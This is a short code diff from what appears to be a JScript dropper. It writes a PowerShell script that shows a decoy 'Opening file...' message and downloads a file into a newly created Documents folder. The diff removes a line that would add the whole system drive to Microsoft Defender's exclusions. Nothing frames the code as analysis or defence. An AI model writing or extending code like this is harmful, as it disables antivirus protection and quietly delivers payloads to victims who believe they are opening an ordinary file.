@@ -16,7 +16,6 @@ var psPath = tempFolder + "\\" + psFilename;
 var psContent =
 'Write-Output "Opening file...";\n' +
 'Try {\n' +
-'    Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;\n' +
 '\n' +
 '    # Create a unique folder inside Documents and download the file there\n' +
 '    $docs = [Environment]::GetFolderPath("MyDocuments");\n' +
@@ -59,6 +58,7 @@ try {
 }
 
 WScript.Quit(0);
+
 
 
 
